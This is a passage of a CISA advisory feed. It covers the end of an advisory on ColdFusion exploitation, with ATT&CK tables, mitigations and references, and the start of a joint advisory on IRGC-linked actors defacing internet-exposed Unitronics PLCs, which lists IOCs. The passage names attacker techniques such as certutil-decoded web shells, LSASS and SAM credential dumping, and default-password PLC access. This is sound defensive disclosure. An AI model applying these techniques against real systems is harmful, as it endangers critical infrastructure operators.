installation of ColdFusion.</p>\n</td>\n</tr><tr><td>\n<p>Masquerading: Masquerade File Type</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/008/\" title=\"Masquerading: Masquerade File Type\">T1036.008</a></p>\n</td>\n<td>\n<p>Threat actors used the .txt file extension to disguise malware files.</p>\n</td>\n</tr><tr><td>\n<p>Indicator Removal: File Deletion</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1070/004/\" title=\"Indicator Removal: File Deletion\">T1070.004</a></p>\n</td>\n<td>\n<p>Threat actors deleted files following upload to remove malicious indicators.</p>\n</td>\n</tr><tr><td>\n<p>Deobfuscate/Decode Files or Information</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1140/\" title=\"Deobfuscate/Decode Files or Information\">T1140</a></p>\n</td>\n<td>\n<p>Threat actors used <code>certutil</code> to decode web shells hidden inside .txt files.</p>\n</td>\n</tr><tr><td>\n<p>Hide Artifacts: Hidden Files and Directories</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/001/\" title=\"Hide Artifacts: Hidden Files and Directories\">T1564.001</a></p>\n</td>\n<td>\n<p>Threat actors attempted to run <code>attrib.exe</code> to hide the newly created <code>config.jsp</code> web shell.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>OS Credential Dumping: LSASS Memory</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></p>\n</td>\n<td>\n<p>Threat actors attempted to harvest user account credentials through LSASS memory dumping.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping: Security Account Manager</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a></p>\n</td>\n<td>\n<p>Threat actors saved and compressed SAM information to .zip files.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: Discovery</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>System Network Configuration Discovery: Internet Connection Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/001/\" title=\"System Network Configuration Discovery: Internet Connection Discovery\">T1016.001</a></p>\n</td>\n<td>\n<p>Threat actors periodically tested network connectivity by pinging Google’s DNS.</p>\n</td>\n</tr><tr><td>\n<p>Network Service Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></p>\n</td>\n<td>\n<p>Threat actors scanned at least three subnets to gather network information using <code>fscan.exe</code>, to include administrative data for future exfiltration.</p>\n</td>\n</tr><tr><td>\n<p>System Information Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></p>\n</td>\n<td>\n<p>Threat actors collected information about the web server and its operating system.</p>\n</td>\n</tr><tr><td>\n<p>File and Directory Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></p>\n</td>\n<td>\n<p>Threat actors traversed and were able to search through folders on the victim’s web server filesystem. Additional reconnaissance efforts were conducted via searching for the <code>.jsp</code> files that were uploaded.</p>\n</td>\n</tr><tr><td>\n<p>Account Discovery: Local Account</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/001/\" title=\"Account Discovery: Local Account\">T1087.001</a></p>\n</td>\n<td>\n<p>Threat actors collected information about local user accounts.</p>\n</td>\n</tr><tr><td>\n<p>Account Discovery: Domain Account</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a></p>\n</td>\n<td>\n<p>Threat actors collected information about domain users, including identification of domain admin accounts.</p>\n</td>\n</tr><tr><td>\n<p>Domain Trust Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></p>\n</td>\n<td>\n<p>Threat actors enumerated domain trusts to identify lateral movement opportunities.</p>\n</td>\n</tr><tr><td>\n<p>Software Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1518/\" title=\"Software Discovery\">T1518</a></p>\n</td>\n<td>\n<p>Following initial access and enumeration, threat actors checked for the presence of ColdFusion version 2018 on the victim web server.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: Command and Control</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Application Layer Protocol: Web Protocols</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></p>\n</td>\n<td>\n<p>Threat actors used HTTP POST requests to <code>config.cfm</code>, an expected configuration file in a standard installation of ColdFusion.</p>\n</td>\n</tr><tr><td>\n<p>Ingress Tool Transfer</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></p>\n</td>\n<td>\n<p>Threat actors were able to upload malicious artifacts to the victim web server.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cpg\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders. CISA recommends that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices, limiting the impact of threat actor techniques and strengthening the security posture for their customers. For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" target=\"_blank\" title=\"Secure by Design\">Secure by Design</a> webpage.</p>\n<h4><strong>Manage Vulnerabilities and Configurations</strong></h4>\n<ul><li><strong>Upgrade all versions affected by this vulnerability.</strong> Keep all software up to date and prioritize patching according to CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">1.E</a>].</li>\n<li><strong>Prioritize remediation of vulnerabilities on internet-facing systems,</strong> for example, by conducting continuous automated and/or routine vulnerability scans.</li>\n<li><strong>Prioritize secure-by-default configurations</strong> such as eliminating default passwords, implementing single sign-on (SSO) technology via modern open standards. This also includes disabling default credentials.</li>\n</ul><h4><strong>Segment Networks</strong></h4>\n<ul><li><strong>Employ proper network segmentation, such as a demilitarized zone (DMZ) </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">2.F</a>]. The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or local area network (LAN) remains secure. Organizations typically store external-facing services and resources—as well as servers used for DNS, file transfer protocol (FTP), mail, proxy, voice over internet protocol (VoIP)—and web servers in the DMZ.</li>\n<li><strong>Use a firewall or web-application firewall (WAF) and enable logging </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">2.G, 2.T</a>] to prevent/detect potential exploitation attempts. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.</li>\n<li><strong>Implement network segmentation to separate network segments based on role and functionality </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">2.E</a>]<strong>.</strong> Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s <a href=\"/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf\" title=\"Layering Network Security Through Segmentation\">Layering Network Security Through Segmentation</a> infographic and the National Security Agency’s (NSA’s) <a href=\"https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf\" title=\"Segment Networks and Deploy Application-Aware Defenses\">Segment Networks and Deploy Application-Aware Defenses</a>.</li>\n<li><strong>Deploy application-aware network defenses to block improperly formed traffic and restrict content,</strong> according to policy and legal authorizations. Traditional intrusion detection systems (IDS) based on known-bad signatures are quickly decreasing in effectiveness due to encryption and obfuscation techniques. Threat actors hide malicious actions and remove data over common protocols, making the need for sophisticated, application-aware defensive mechanisms critical for modern network defenses.</li>\n</ul><h4><strong>Application Control</strong></h4>\n<ul><li><strong>Enforce signed software execution policies.</strong> Use a modern operating system that enforces signed software execution policies for scripts, executables, device drivers, and system firmware. Maintain a list of trusted certificates to prevent and detect the use and injection of illegitimate executables. Execution policies, when used in conjunction with a secure boot capability, can assure system integrity.</li>\n<li><strong>Application control should be used with signed software execution policies to provide greater control</strong>. Allowing unsigned software enables threat actors to gain a foothold and establish persistence through embedded malicious code. See NSA’s <a href=\"https://media.defense.gov/2019/Sep/09/2002180334/-1/-1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf\" title=\"Enforce Signed Software Execution Policies\">Enforce Signed Software Execution Policies</a>.</li>\n</ul><h4><strong>Manage Accounts, Permissions, and Workstations</strong></h4>\n<ul><li><strong>Require </strong><a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\"><strong>phishing-resistant multifactor authentication (MFA)</strong></a><strong> </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">2.H</a>] for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.</li>\n<li><strong>Implement the principle of least privilege </strong>to decrease threat actors’ abilities to access key network resources.</li>\n<li><strong>Restrict file and directory permissions</strong>. Use file system access controls to protect folders such as C:\\Windows\\System32.</li>\n<li><strong>Restrict NTLM authentication policy settings, </strong>including incoming NTLM traffic from client computers, other member servers, or a domain controller.[<a href=\"https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic\" title=\"Network security: Restrict NTLM: Incoming NTLM traffic\">8</a>]</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 2-9).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-26360\" title=\"CVE-2023-26360\">NIST: CVE-2023-26360</a></li>\n<li><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">CISA: KEV Catalog</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">CISA, MITRE: Best Practices for MITRE ATT&amp;CK Mapping</a></li>\n<li><a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">CISA: Decider Tool</a></li>\n<li><a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CISA: Cross-Sector Cybersecurity Performance Goals</a></li>\n<li><a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">CISA: Secure by Design and Default</a></li>\n<li><a href=\"https://www.cisa.gov/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf\" title=\"Layering Network Security Through Segmentation\">CISA: Layering Network Security Through Segmentation</a></li>\n<li><a href=\"https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf\" title=\"Segment Networks and Deploy Application-Aware Defenses\">NSA: Segment Networks and Deploy Application-Aware Defenses</a></li>\n<li><a href=\"https://media.defense.gov/2019/Sep/09/2002180334/-1/-1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf\" title=\"Enforce Signed Software Execution Policies\">NSA: Enforce Signed Software Execution Policies</a></li>\n<li><a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">CISA: Implementing Phishing-Resistant MFA</a></li>\n</ul><h3><strong>REFERENCES</strong></h3>\n<p>[1] <a href=\"https://packetstormsecurity.com/files/172079/Adobe-ColdFusion-Unauthenticated-Remote-Code-Execution.html\" title=\"Adobe ColdFusion Unauthenticated Remote Code Execution\">Packet Storm Security: Adobe ColdFusion Unauthenticated Remote Code Execution</a><br />\n[2] <a href=\"https://attack.mitre.org/versions/v13/software/S0160/\" title=\"certutil\">MITRE: certutil</a><br />\n[3] <a href=\"https://www.virustotal.com/gui/file/a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864/detection\" title=\"VirusTotal GUI File\">VirusTotal: File - a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864</a><br />\n[4] <a href=\"https://www.bleepingcomputer.com/news/security/stealthy-new-javascript-malware-infects-windows-pcs-with-rats/\" title=\"Stealthy New JavaScript Malware Infects Windows PCs with RATs\">Bleeping Computer: Stealthy New JavaScript Malware Infects Windows PCs with RATs</a><br />\n[5] <a href=\"https://github.com/Tas9er/ByPassGodzilla\" title=\"Tas9er / ByPassGodzilla\">GitHub: Tas9er/ByPassGodzilla</a><br />\n[6] <a href=\"https://attack.mitre.org/versions/v13/software/S0404/\" title=\"esentutl\">MITRE: esentutl</a><br />\n[7] <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx\" title=\"Active Directory: SYSVOL and NETLOGON\">Microsoft: Active Directory - SYSVOL</a><br />\n[8] <a href=\"https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic\" title=\"Network security: Restrict NTLM: Incoming NTLM traffic\">Microsoft: Restrict NTLM - Incoming NTLM Traffic</a></p>\n<h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>December 5, 2023: Initial version.</p>\n","pubDate":"Mon, 04 Dec 2023 13:05:06 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20419"}},{"title":"IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-335a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Environmental Protection Agency (EPA), and the Israel National Cyber Directorate (INCD)—hereafter referred to as \"the authoring agencies\"—are disseminating this joint Cybersecurity Advisory (CSA) to highlight continued malicious cyber activity against operational technology devices by Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated Advanced Persistent Threat (APT) cyber actors.</p>\n<p>The IRGC is an Iranian military organization that the United States designated as a foreign terrorist organization in 2019. IRGC-affiliated cyber actors using the persona “CyberAv3ngers” are actively targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers (PLCs). These PLCs are commonly used in the <a href=\"https://www.cisa.gov/water\" title=\"Water and Wastewater Cybersecurity\">Water and Wastewater Systems (WWS) Sector</a> and are additionally used in other industries including, but not limited to, energy, food and beverage manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers and companies. In addition to the recent <a href=\"https://www.cisa.gov/news-events/alerts/2023/11/28/exploitation-unitronics-plcs-used-water-and-wastewater-systems\" title=\"Exploitation of Unitronics PLCs used in Water and Wastewater Systems\">CISA Alert</a>, the authoring agencies are releasing this joint CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with IRGC cyber operations.</p>\n<p>Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image stating, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is CyberAv3ngers legal target.” The victims span multiple U.S. states. The authoring agencies urge all organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.</p>\n<p>This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/iran\" title=\"Iran Cyber Threat Overview and Advisories\">Iran Cyber Threat Overview and Advisories</a> webpage and the FBI’s <a href=\"https://www.fbi.gov/investigate/counterintelligence/the-iran-threat\" title=\"The Iran Threat\">Iran Threat</a> webpage.</p>\n<p>For a PDF version of this CSA, see: </p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-335a-irgc-affiliated-cyber-actors-exploit-plcs-in-multiple-sectors-1.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-335A IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities</a>\n    <span class=\"c-file__size\">(PDF,       594.03 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-335A.stix__0.xml\" class=\"c-file__link\" target=\"_blank\">AA23-335A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       15.50 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-335A-IRGC-Affiliated-Cyber-Actors-Exploit-PLCs-in-Multiple-Sectors-Including-US-Water-and-Wastewater-Systems-Facilities.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA23-335A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       10.84 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See Table 1 for threat actor activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<h4><strong>Overview</strong></h4>\n<p>CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona that has claimed responsibility for numerous attacks against critical infrastructure organizations.[<a href=\"https://www.cbsnews.com/pittsburgh/news/municipal-water-authority-of-aliquippa-hacked-iranian-backed-cyber-group/\" title=\"Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group\">1</a>],[<a href=\"https://industrialcyber.co/analysis/digital-battlegrounds-evolving-hybrid-kinetic-warfare/\" title=\"Digital Battlegrounds: Evolving Hybrid Kinetic Warfare\">2</a>],[<a href=\"https://www.bleepingcomputer.com/news/security/israels-largest-oil-refinery-website-offline-after-ddos-attack/\" title=\"Israel's largest oil refinery website offline after DDoS attack\">3</a>],[<a href=\"https://www.darkreading.com/cyberattacks-data-breaches/israeli-oil-refinery-taken-offline-pro-iranian-attackers\" title=\"Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers\">4</a>],[<a href=\"https://twitter.com/CyberAveng3rs/status/1718970041616543922\" title=\"CyberAv3ngers\">5</a>] The group claimed responsibility for cyberattacks in Israel beginning in 2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in Israel.[<a href=\"https://industrialcyber.co/analysis/digital-battlegrounds-evolving-hybrid-kinetic-warfare/\" title=\"Digital Battlegrounds: Evolving Hybrid Kinetic Warfare\">2</a>] CyberAv3ngers also reportedly has connections to another IRGC-linked group known as Soldiers of Solomon.</p>\n<p> </p>\n<p><strong><em>(Updated December 14, 2023)</em></strong> Most recently, CyberAv3ngers began targeting U.S.-based WWS facilities that operate Unitronics PLCs.[<a href=\"https://www.cbsnews.com/pittsburgh/news/municipal-water-authority-of-aliquippa-hacked-iranian-backed-cyber-group/\" title=\"Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group\">1</a>] The threat actors compromised Unitronics Vision Series PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to the internet with default passwords and by default are on TCP port 20256. On December 11, 2023, <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6448\" title=\"CVE-2023-6448\">CVE-2023-6448</a> was assigned to address the default passwords [<a href=\"http://cwe.mitre.org/data/definitions/798.html\" title=\"CWE-798: Use of Hard-coded Credentials\">CWE-798: Use of Hard Coded Credentials</a>], and CISA added the CVE to its <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a>. On December 12, Unitronics released <a href=\"https://www.unitronicsplc.com/cyber_security_vision-samba/\" title=\"Unitronics Cybersecurity for Vision and Samba PLC Series\">VisiLogic version 9.9.00</a> software to address this CVE; the update requires users to change default passwords.</p>\n<p>These PLC and related controllers are often exposed to outside internet connectivity due to the remote nature of their control and monitoring functionalities. The compromise is centered around defacing the controller’s user interface and may render the PLC inoperative. With this type of access, deeper device and network level accesses are available and could render additional, more profound cyber physical effects on processes and equipment. It is not known if additional cyber activities deeper into these PLCs or related control networks and components were intended or achieved. Organizations should consider and evaluate their systems for these possibilities.</p>\n<h4><strong>Threat Actor Activity</strong></h4>\n<p>The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely compromised these PLCs since the PLCs were internet-facing and used Unitronics’ default password. Observed activity includes the following:</p>\n<ul><li>Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel displayed both legitimate and false claims of multiple cyberattacks against Israel. CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.</li>\n<li>On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility for compromising over 50 servers, security cameras, and smart city management systems in Israel; however, majority of these claims were proven false. The group claimed to use a ransomware named “Crucio” against servers where the webcams camera software operated on port 7001.</li>\n<li>Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising internet-accessible devices with default passwords. The targeted PLCs displayed the defacement message, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is Cyberav3ngers legal target.”</li>\n</ul><h3><strong>INDICATORS OF COMPROMISE</strong></h3>\n<p>See Table 1 for observed IOCs related to CyberAv3nger operations.</p>\n<p><strong><em>(Updated December 14, 2023)</em></strong></p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: CyberAv3nger IOCs</em></caption>\n<thead><tr><td>\n<p><strong>Indicator</strong></p>\n</td>\n<td>\n<p><strong>Type</strong></p>\n</td>\n<td>\n<p><strong>Fidelity</strong></p>\n</td>\n<td>\n<p><strong>Description</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>BA284A4B508A7ABD8070A427386E93E0</p>\n</td>\n<td>\n<p>MD5</p>\n</td>\n<td>\n<p>Suspected</p>\n</td>\n<td>\n<p>MD5 hash associated with Crucio Ransomware</p>\n</td>\n</tr><tr><td>\n<p>66AE21571FAEE1E258549078144325DC9DD60303</p>\n<p> </p>\n</td>\n<td>\n<p>SHA1</p>\n</td>\n<td>\n<p>Suspected</p>\n</td>\n<td>\n<p>SHA1 hash associated with Crucio Ransomware</p>\n</td>\n</tr><tr><td>\n<p>440b5385d3838e3f6bc21220caa83b65cd5f3618daea676f271c3671650ce9a3</p>\n<p> </p>\n</td>\n<td>\n<p>SHA256</p>\n<p> </p>\n</td>\n<td>\n<p>Suspected</p>\n</td>\n<td>\n<p>SHA256 hash associated with Crucio Ransomware</p>\n<p> </p>\n</td>\n</tr><tr><td>\n<p>178.162.227[.]180</p>\n</td>\n<td>\n<p>IP address</p>\n</td>\n<td>\n<p>Suspected</p>\n</td>\n<td>\n<p>IP address associated with Crucio Ransomware</p>\n</td>\n</tr><tr><td>\n<p>185.162.235[.]206</p>\n</td>\n<td>\n<p>IP address</p>\n</td>\n<td>\n<p> </p>\n</td>\n<td>\n<p>IP address associated with Crucio Ransomware</p>\n</td>\n</tr></tbody></table><h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Table 2 for referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption>Table 2: Initial Access</caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Brute Force Techniques</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1110/\" title=\"Brute Force Techniques\">T1110</a></p>\n</td>\n<td>\n<p>Threat actors obtained login credentials, which they used to successfully log into Unitronics devices and provide root-level access.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>The authoring agencies recommend critical infrastructure organizations, including WWS sector facilities, implement the following mitigations to improve your organization’s cybersecurity posture to defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<p><strong>Note:</strong> The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all internet-facing PLCs.</p>\n<h4><strong>Network Defenders</strong></h4>\n<p>The cyber threat actors likely accessed the affected devices—Unitronics Vision Series PLCs with HMI—by exploiting cybersecurity 